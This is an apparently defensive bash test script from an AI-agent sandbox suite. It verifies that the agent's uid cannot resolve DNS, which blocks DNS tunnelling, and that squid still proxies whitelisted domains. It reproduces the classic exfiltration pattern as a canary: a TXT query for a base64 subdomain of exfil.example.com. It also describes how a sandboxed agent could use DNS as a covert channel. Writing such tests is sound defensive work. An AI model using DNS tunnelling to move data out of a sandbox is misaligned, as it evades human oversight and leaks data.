#!/usr/bin/env bash
# Case 12: the DNS-tunnel mitigation. The agent (dev uid) must NOT be able
# to use the resolver (127.0.0.11, or any upstream :53) as an exfil/C2
# channel — unless the project explicitly set 'agent-dns: allow'
# (/etc/agent-dns). When squid is active (non-empty domain whitelist) it
# must still be able to forward: a request via the proxy for a whitelisted
# domain must answer — that proves the drop is scoped to the dev uid only.
# shellcheck source=/dev/null
. "$(dirname "$0")/../common.sh"

AGENT_DNS_FILE="/etc/agent-dns"
MODE="$(tr -d '[:space:]' < "${AGENT_DNS_FILE}" 2>/dev/null || echo deny)"
echo "agent-dns mode: ${MODE} (from ${AGENT_DNS_FILE})"

if ! command -v dig >/dev/null 2>&1; then
  echo "SKIP: dig not available in this image"
  exit 0
fi

# ---------------------------------------------------------------------------
# allow mode (explicit opt-in): the tunnel is open by configuration. Only
# verify the resolver is reachable at all (no accidental total breakage).
# ---------------------------------------------------------------------------
if [[ "${MODE}" == "allow" ]]; then
  if ! dig +time=3 +tries=1 A localhost @127.0.0.11 >/dev/null 2>&1; then
    fail "agent-dns: allow, but resolver 127.0.0.11 is unreachable at all"
  fi
  pass "agent-dns: allow (tunnel explicitly opened by config; resolver functional)"
fi

# ---------------------------------------------------------------------------
# deny mode (default): every lookup from the dev uid must come back empty.
# 127.0.0.11 is Docker's built-in resolver; the firewall drops dev :53, so
# dig must time out / return no answer section.
# ---------------------------------------------------------------------------
ANSWER="$(dig +time=3 +tries=1 +noall +answer A example.com @127.0.0.11 2>/dev/null)"
if grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' <<< "${ANSWER}" | grep -q .; then
  fail "DNS tunnel STILL OPEN: 'dig A example.com @127.0.0.11' returned an address"
fi

# The classic exfil pattern: TXT record on a data-bearing subdomain.
SUB="$(printf '%s' "ocs-canary-${RANDOM}${RANDOM}" | base64 -w0 2>/dev/null || printf '%s' "ocs-canary" | base64)"
TXTOUT="$(dig +time=3 +tries=1 +noall +answer "TXT ${SUB}.exfil.example.com" @127.0.0.11 2>/dev/null)"
if grep -q '"' <<< "${TXTOUT}"; then
  fail "DNS tunnel STILL OPEN: TXT exfil pattern returned data via 127.0.0.11"
fi

# ---------------------------------------------------------------------------
# Positive check: squid (if active) must still proxy a whitelisted domain,
# i.e. its own uid keeps resolver access. Skipped when no whitelist (sectest
# has none — squid is not started at all in that case).
# ---------------------------------------------------------------------------
SQUID_OK="n/a (no whitelist / squid inactive)"
if [[ -s /etc/squid/squid-whitelist.txt ]] && command -v curl >/dev/null 2>&1; then
  DOMAIN="$(sed -n '1p' /etc/squid/squid-whitelist.txt | sed 's/^\.\?//; s/[[:space:]]*$//')"
  if [[ -n "${DOMAIN}" ]]; then
    STATUS="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
      -x http://127.0.0.1:3128 "http://${DOMAIN}/" 2>/dev/null)" || STATUS=000
    case "${STATUS}" in
      2*|3*) SQUID_OK="ok (squid proxied ${DOMAIN}, HTTP ${STATUS})" ;;
      *)
        fail "squid active but CANNOT proxy whitelisted domain ${DOMAIN} (HTTP ${STATUS}) — the dev-DNS drop is too broad"
        ;;
    esac
  fi
fi

pass "agent-DNS tunnel blocked (dev uid :53 dropped); squid ${SQUID_OK}"
